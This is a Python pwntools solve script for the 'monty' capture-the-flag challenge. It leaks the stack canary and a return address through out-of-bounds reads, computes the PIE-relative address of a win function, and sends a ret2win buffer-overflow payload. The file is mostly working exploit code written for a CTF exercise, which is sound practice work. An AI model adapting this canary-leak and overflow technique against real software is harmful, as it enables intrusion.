#!/usr/bin/env python3

"""
This challenge involves performing a classic ret2win by taking advantage of
buffer overreads allowed during the peeks. Both peeks allow you to view values
on the stack past the cards buffer. Using this, we can leak the stack canary
allowing us to perform the buffer overflow by overwriting the canary with the
value we leak. Because PIE is enabled, we can the use the second peek to leak
the old value of RIP and because PIE still loads functions with relative
addresses to one another, we can calculate the address of the win function. We
don't need to swap back the canary since we can just overwrite it with the same
value we leaked.
"""

from pwn import *

if args.REMOTE:
    r = remote("chall.lac.tf", 31132)
else:
    r = process("./monty")

r.recvuntil(b"index of your first peek? ")
r.sendline(b"55")
val = r.recvline()
canary = int(str(val)[10:-3])

r.recvuntil(b"index of your second peek? ")
r.sendline(b"57")
val = r.recvline()
main = int(str(val)[10:-3])

r.recvuntil(b"Show me the lady! ")
r.sendline(b"1")

# offset = (addr of old RIP) - (addr of win)
offset = 0x0000167E - 0x0001239
win = main - offset
payload = b"a" * 0x18 + p64(canary) + b"a" * 8 + p64(win)

r.recvuntil(b"Name: ")
r.sendline(payload)

r.interactive()
